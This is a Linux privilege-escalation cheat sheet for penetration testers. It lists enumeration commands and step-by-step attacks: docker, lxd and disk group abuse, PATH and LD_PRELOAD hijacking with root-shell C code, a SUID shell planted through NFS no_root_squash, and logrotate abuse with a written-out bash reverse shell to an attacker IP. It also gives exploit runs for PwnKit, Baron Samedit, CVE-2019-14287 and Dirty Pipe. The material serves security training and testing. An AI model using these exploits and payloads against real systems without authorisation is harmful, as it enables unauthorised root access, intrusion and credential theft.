# Linux Privilege Escalation

## **Initial Enumeration Commands**

### **Helper Tools**

1. [https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
2. [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)
3. [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)

***

### **Processes and Jobs**

| Command                  | Description                                                                  |
| ------------------------ | ---------------------------------------------------------------------------- |
|  `ps aux \| grep root`   | See processes running as root                                                |
| `./pspy64 -pf -i 1000`   | View running processes with `pspy`                                           |
| `ls -la /etc/cron.daily` | Check for daily Cron jobs                                                    |
| `lpstat`                 | Look for active or queued print jobs to gain access to sensitive information |

***

### **Kernel and OS**

| Command                | Description                                                  |
| ---------------------- | ------------------------------------------------------------ |
| `hostname`             | Check the hostname (useful to ensure the target is in scope) |
| `uname -a`             | Check the Kernel version                                     |
| `cat /proc/version`    | Check the Kernel version                                     |
| `cat /etc/lsb-release` | Check the OS version                                         |
| `cat /etc/os-release`  | Check the OS version                                         |
| `lscpu`                | Gather additional information about the host                 |
| `sudo -V`              | Check sudo version                                           |

***

### **User-Related**

| Command      | Description                                     |
| ------------ | ----------------------------------------------- |
| `echo $PATH` | Check the current user's PATH variable contents |
| `ps au`      | See logged in users                             |
| `history`    | Check the current user's Bash history           |
| `whoami`     | Check what user we are running as               |
| `id`         | Check what groups we belong to                  |
| `sudo -l`    | Can the user run anything as another user?      |

***

### **Network Related**

| Command                | Description                                                                                                    |
| ---------------------- | -------------------------------------------------------------------------------------------------------------- |
| `ip -a`                | Check network interfaces                                                                                       |
| `ipconfig`             | Check network interfaces                                                                                       |
| `hostname -I`          | Display all IP addresses related to the host                                                                   |
| `cat /etc/hosts`       | Check for potential interesting hosts                                                                          |
| `route`                | Check out the routing table to see what other networks are available via which interface                       |
| `netstat -rn`          | Check out the routing table to see what other networks are available via which interface                       |
| `arp -a`               | Check the arp table to see what other hosts the target has been communicating with                             |
| `cat /etc/resolv.conf` | Check if the host is configured to use internal DNS → Starting point to query the Active Directory environment |

***

### **Finding Interesting Files and Directories**

* Find all accessible history files:\
  `find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null`
* Find world-writeable directories: `find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null`
* Find all hidden directories: `find / -type d -name ".*" -ls 2>/dev/null`
* Find all hidden files: `find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null`
* Find world-writeable files: `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null`
* Find binaries with the SUID bit set: `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`
* Find binaries with the SETGID bit set: `find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null`
* Find binaries and enumerate their capabilities:\
  `find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;`
* Search for config files: `find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null`
* Find configuration files: `find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null`
* Find `.sh` scripts: `find / -type f -name "*.sh" 2>/dev/null \| grep -v "src\|snap\|share"`
* Resursively inspect file contents to find instances of "word": `grep -r "word" /starting-path`
* Find temporary files: `ls -l /tmp /var/tmp /dev/shm`

***

## **Linux Privileged Groups Privilege Escalation**

### **ADM Group**

> * Members of the adm group are able to read all logs stored in `/var/log`.
> * This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.

***

### **LXC and LXD groups (Linux Containers) Privilege Escalation**

> * **Prerequisites:** the current used needs to be a **member of** the `lxc` or `lxd` **groups**
> * **Description:** it is possible to grant ourselves root privileges by editing the container template (often forgot on the target machine)

**Attack Path:**

1. Suppose we found a folder named `ContainerImages` where the container image is stored (without any password protection)
2. Import the container as an image: `lxc image import container-template-name.tar.xz --alias temp`
3. Ensure the container was imported: `lxc image list`
4. Start a privileged container named `r00t`: `lxc init temp r00t -c security.privileged=true`
   * This will start a privileged container with the `security.privileged` set to `true` to run the container without a UID mapping, making the root user in the container the same as the root user on the host.
5. Mount the host file system: `lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true`
6. Start the container: `lxc start r00t`
7. The host filesystem will be mounted inside the container at the previously specified path (e.g. `/mnt/root`)

***

### **Docker Group**

> * Placing a user in the docker group is essentially **equivalent to root level access to the file system without requiring a password**.
> * Members of the docker group can spawn new docker containers.

**Example:**

* One example would be running the command `docker run -v /root:/mnt -it ubuntu`
* This command creates a new Docker instance with the `/root` directory on the host file system mounted as a volume.
* This way, it is possible to browse to the mounted directory(holding the entire filesystem) and retrieve or add SSH keys for the root user or retrieve the contents of the `/etc/shadow` file for offline password cracking or adding a privileged user.

***

### **Disk Group**

> * Users within the disk group have full access to any devices contained within `/dev`
> * Such as `/dev/sda1`, which is typically the main device used by the operating system.
> * An attacker with these privileges can use `debugfs` to access the entire file system with root level privileges.
> * This could be leveraged to retrieve SSH keys, credentials or to add a user.

***

## **Environment Variables Abuse**

### **PATH Abuse**

> **What is the purpose of the PATH variable?**
>
> * PATH is an environment variable that **specifies the set of directories where an executable can be located**.
> * An account's PATH variable is a set of absolute paths, **allowing a user to type a command without specifying the absolute path to the binary**.
> * For example, a user can type `cat /tmp/test.txt` instead of specifying the absolute path `/bin/cat /tmp/test.txt`.
> * Creating a script or program in a directory specified in the PATH will make it executable from any directory on the system.

**Interacting with the PATH varable:**

* Check the contents of the PATH variable: `env | grep PATH` or `echo $PATH`
* Adding `.` to a user's PATH adds their current working directory to the list.
* To add a specific directory at the top of the PATH list: `export PATH=/tmp:$PATH`
* To add the current working directory at the top of the PATH list: `export PATH=.:$PATH`

**Abusing the PATH variable:**

* **Prerequisites:** a program or script running as root and its source code (or part of it)
* **Example Exploitation Steps:**
  * Suppose we can read the source code of a program
  * Suppose the source code reveals that the program makes use of a command or script without specifying its full path
  * e.g. The program uses `echo something` instead of `/usr/bin/echo something`
  * In that case, we can write and compile a C program with the same name as the command/script (`echo`) that gives us a reverse shell
  * After that, edit the PATH variable in order to prepend the exploit's directory on top (`export PATH=/dir-to-exploit:$PATH`)
  * Run the vulnerable program and get the reverse shell as root
* **Explaination:** the program tries to run the echo command, but it needs to look at the PATH variable since the command's full (absolute) path was not specified. The PATH variable's first directory will be the folder containing the exploit code, which will be ran by the program instead of the "real" echo command. The exploit code will be ran using the program's privileges (root), allowing us to escalate privileges

***

### **LD\_PRELOAD Abuse**

> **What is the purpose of the LD\_PRELOAD variable?**
>
> * LD\_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects
> * All shares libraries/objects specified by this variable will be loaded (preloaded) before any other shared library

**Prerequisites to abuse the LD\_PRELOAD variable:**

* Suppose to have a script running as root
* Suppose you can read the source code of that script
* Alternatively, use `ldd /bin/scriptname` in order to view the shared objects required by a binary
* To abuse ld\_preload, you need to write a C code containing the `same signature of a function used by the program`
* This means that:
  * All `#include` statements are the same as the original function's
  * The `return value` needs to be the same as the original function's

**Example PoC code:**

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

**Steps to reproduce the attack:**

1. Identify a target binary and a target function used by it
2. Write a PoC code with the same signature as the original function's (see PoC above)
3. Compile it (as a shared library) using: `gcc -fPIC -shared -o exploit.so exploit.c -nostartfiles`
4. Gain privilege escalation using: `sudo LD_PRELOAD=./pe.so <COMMAND>`

***

## **Capabilities Abuse**

> * Linux capabilities are a security feature in the Linux operating system that allows specific privileges to be granted to processes, allowing them to perform specific actions that would otherwise be restricted.
> * Linux capabilities provide a subset of the available root privileges to a process. This effectively breaks up root privileges into smaller and distinctive units. Each of these units can then be independently be granted to processes.
> * One common vulnerability is using capabilities to grant privileges to processes that are not adequately sandboxed or isolated from other processes, allowing us to escalate their privileges and gain access to sensitive information or perform unauthorized actions.
> * Another potential vulnerability is the misuse or overuse of capabilities, which can result in processes having more privileges than they need.

**Interacting with capabilities:**

* Enumerate all capabilities:\
  `find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;`
* Enumerate a specific binary's capabilities: `getcap /usr/bin/binaryname`

**Capability values:**

| Capability Values | Desciption                                                                                                                                                                                                                                                                                                                                                                                                                    |
| ----------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `+ep`             | This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability.                                                                                                                                                    |
| `+ei`             | This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions.                                                                                                                                    |
| `+p`              | This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it. |

**Interesting capabilities:**

* `CAP_SETUID`: Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the root user.
* `CAP_SETGID`: Allows to set its effective group ID, which can be used to gain the privileges of another group, including the root group.
* `cap_sys_admin`: Allows to perform actions with administrative privileges, such as modifying system files or changing system settings.
* `cap_sys_chroot`: Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible.
* `cap_sys_ptrace`: Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes.
* `cap_sys_nice`: Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted.
* `cap_sys_time`: Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways.
* `cap_sys_resource`: Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated.
* `cap_sys_module`: Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information.
* `cap_net_bind_service`: Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions.

***

## **Programs, Jobs and Services**

### **CronJob Abuse**

> * Scheduled jobs, typically used for administrative tasks, creating backups, cleaning directories etc
> * The `crontab` command can create a cron file, which will be run by the cron daemon on the schedule specified
> * When created, the cron file will be created in /var/spool/cron for the specific user that creates it
> * Each entry in the crontab file requires six items in the following order: `minutes, hours, days, months, weeks, commands`.

**Exploiting Cronjobs:**

* By using `pspy` we can view running processes and commands run by others users without the need for root privileges
* CronJobs can be abused by analyzing their behaviour and the files they interact with
* Suppose a cronjob runs a backup script as root periodically.
* If we can interact with any resources handled by the script (or the script itself) we may be able to edit the logic of such script in order to get a reverse shell as the user running such cronjob (root)

***

### **Logrotate Abuse**

> * `logrotate` is a tool (typically ran as a `cronjob`) used to manage all logs in `/var/logs`
> * Its global settings configuration file is located at `/etc/logrotate.conf`, the `/etc/logrotate.d/` instead contains the configuration files for all forced rotations (after the first one)

**Exploiting logrotate with LogRotten:**

* **Prerequisites:** logrotate must run as `root` and we need `write permissions` on the logrotate log files
* **Vulnerable versions:** `3.8.6` `3.11.0` `3.15.0` `3.18.0`
* **Exploitation steps:**
  1. Use `pspy` to verify that a `cronjob` running `logrotate` as `root` is ran periodically
  2. Identify the logfile being rotated periodically: such files typically have a filename format like `filename.log.1` for the first rotation, then `filename.log.2` and so on
  3. `git clone https://github.com/whotwagner/logrotten.git`
  4. `gcc logrotten.c -o logrotten`
  5. `echo 'bash -i >& /dev/tcp/your-ip/nc-port 0>&1' > payload`
  6. Start the netcat listener on the attacker machine: nc -lvnp 9001
  7. Determine the option used by logrotate (create or compress): `grep "create\|compress" /etc/logrotate.conf | grep -v "#"`
  8. Adapt the payload based on the option specified in the `logrotate.conf` file:
     * Create: `./logrotten -p ./payload /tmp/log/pwnme.log`
     * Compress: `./logrotten -p ./payload -c -s 4 /tmp/log/pwnme.log`
  9. Wait for the rotation and get the reverse shell as root

10. _**Disclaimer:**_ sometimes you might need to edit the logfile (add a blank space) in order to trigger the rotation

***

## **Miscellaneous Techniques**

### **Shared Object Hijacking - Binary RUNPATH variable**

A binary or program may use a custom library that can be enumerated by using one of the following commands:

* `ldd /path/to/program-name`
* `readelf -d /path/to/program-name | grep PATH`

By checking the `RUNPATH` content, we can verify if a custom directory is being used.\
Custom libraries specified by the RUNPATH have higher priority compared to the other libraries, similarly. to LD\_PRELOAD\
In other terms, if the `RUNPATH` contains `/directoryname/customlibrary.so` we can hijack the shared library to elevate privileges

To abuse the RUNPATH, the procedure is the _same as the `LD_PRELOAD` abuse_:

* identify a function used by binary/program
* write a malicious shared library containing a reverse shell payload inside a function with the same signature as the original one
* substitute the original custom library file with the malicious one

***

### **Weak NFS Privileges to Privesc**

* Any accessible mounts can be listed remotely by issuing the command `showmount -e target-ip`
* When an NFS volume is created, various options can be set
* To escalate privileges, we need to have the `no_root_squash` option
* This option allows remote users connecting to the share as the local root user to create files on the NFS server as the root user.\This would allow for the creation of malicious scripts/programs with the SUID bit set.
* Basically, you can use the attacker's machine root user to create files on the NFS server as the root user
* To enumerate the exports on the machine hosting an NFS Share: `cat /etc/exports`
* If `no_root_squash` is set we can create a `SETUID` binary that executes `/bin/sh` using our local root user. \ We can then mount the `/tmp` directory locally, copy the root-owned binary over to the NFS server, and set the SUID bit.

**Exploitation steps:**

1. Suppose a target machine hosts a NFS Share. We can enumerate that by using `showmount -e target-ip`
2. Suppose we have local access to the target machine. We can check if the `no_root_squash` options is set for the previous share by using `cat /etc/exports`
3.  Write the PoC script:

    ```
    #include <stdio.h>
    #include <sys/types.h>
    #include <unistd.h>
    int main(void)
    {
      setuid(0); setgid(0); system("/bin/bash");
    }
    ```
4. Compile the script: `gcc shell.c -o shell`
5. Use the local root user to copy the file on the NFS share as root:
   * `sudo mount -t nfs 10.129.2.12:/tmp /mnt`
   * `cp shell /mnt`
   * `chmod u+s /mnt/shell`
6. Switching back to the target host's session, we can escalate privileges to root by executing the binary: `cd /tmp; ./shell`

***

### **TMUX Terminal Session Hijacking (Requires DEV group)**

> * Terminal multiplexers such as `tmux` can be used to **allow multiple terminal sessions to be accessed within a single console session**
> * When not working in a tmux window, we can `detach` from the session, still leaving it `active`
> * We can gain a `root` terminal session if a user left a `tmux` process running as a privileged user
> * To do that, we need to have access to a user in the `dev` group to create a new `shared tmux session` and modify its ownership

**Exploitation steps:**

1. Create new shared sessions: `tmux -S /shareds new -s debugsess`
2. Change session owner: `chown root:devs /shareds`
3. Check for any ruynning tmux processes: `ps aux | grep tmux`
4. Attach the tmux session and get root privileges: `tmux -S /shareds`

***

### **Python Library Hijacking**

> * There are many ways in which we can hijack a Python library.
> * Much depends on the script and its contents itself.
> * However, there are three basic vulnerabilities where hijacking can be used

1. **Wrong write permissions:**
   * Requirements: A python script with `SUID` privileges that makes use of any library (`import libraryname`)
   * The library file will be located at `/usr/local/lib/python3.8/dist-packages/libraryname`
   * After checking which library function is called inside the python code, we can edit the library file by injecting a payload such as `import os` `os.system('id')`
   * Executing the python script again will show the results of the `id` command, confirming root privileges
2. **Library Path:**
   * Requirements: write permissions in one of the folders shown by the PYTHONPATH variable (preferrably one of the folders first folders)
   * To enumerate the PYTHONPATH variable contents: `python3 -c 'import sys; print("\n".join(sys.path))'`
   * PoC: if we have write permissions inside one of the folders specified by the PYTHONPATH variable\
     we can proceed in a similar manner as with the standard PATH environment variable abuse.
   * The basic idea is to write a file with the same name and signature as an imported library and inject a payload to run a shell
3. **PYTHONPATH environment variable:**
   * Requirements: permissions to edit the PYTHONPATH variable
   * To check that permission: `sudo -l` → Output: `SETENV: /usr/bin/python3`
   * PoC: edit the `PYTHONPATH` variable in the same way as a standard `PATH` environment variable privilege escalation

***

## **Recent CVEs**

### **PWNKit - CVE-2021-4034**

* **Reference:** [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034)
* **Affected Versions:** All Polkit versions from 2009 onwards are vulnerable
* **Exploit PoC:**
  1. `git clone https://github.com/arthepsy/CVE-2021-4034.git`
  2. `gcc cve-2021-4034-poc.c -o pwnkit`
  3. `./pwnkit`
* **Mitigation:**
  1. Patch polkit
  2. If no patches are available for your system, remove the SUID bit from the pkexec binary

***

### **Weak Sudo Versions - CVE-2021-3156**

* **Reference:** [https://nvd.nist.gov/vuln/detail/cve-2021-3156](https://nvd.nist.gov/vuln/detail/cve-2021-3156)
* **Affected Versions:** `1.8.31 - Ubuntu 20.04` `1.8.27 - Debian 10` `1.9.2 - Fedora 33` and others
* **Exploit PoC:**
  1. `git clone https://github.com/blasty/CVE-2021-3156`
  2. `cd git-folder`
  3. `make`
  4. Check target OS version: `cat /etc/lsb-release`
  5. Check available exploit targets: `./sudo-hax-me-a-sandwich`
  6. Exploit the target OS: `./sudo-hax-me-a-sandwich target-number`

***

### **Weak Sudo Version (prior to 1.8.28) - CVE-2019-14287**

* **Reference:** [https://www.sudo.ws/security/advisories/minus\_1\_uid/](https://www.sudo.ws/security/advisories/minus\_1\_uid/)
* **Affected Versions:** `sudo` versions prior to `1.8.28`
* **Exploit Prerequisites:**
  1. The current user needs to be part of the `sudoers` group
  2. The current user needs to be able to run any command as `(ALL)`
* **Exploit PoC:**
  1. Check sudo permissions: `sudo -l`
  2. Suppose the output of the previous command is `ALL=(ALL) /usr/bin/id`
  3. Run the command `id` as root: `sudo -u#-1 id`

***

### **Dirty Pipe - CVE-2022-0847**

* **Reference:** [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847)
* **Affected Versions:** All kernels from version 5.8 to 5.17
* **Exploit Prerequisites:** This vulnerability allows a user to write to arbitrary files as long as he has read access to these files
* **Exploit PoC:**
  1. Check kernel version: `uname -r`
  2. `git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git`
  3. `cd git-folder`
  4. `bash compile.sh`
  5. \[Option1] Modify the `/etc/passwd` file and get a shell: `./exploit-1`
  6. \[Option2] Identify a SUID binary using `find / -perm -4000` and run `./exploit-2` to leverage that binary file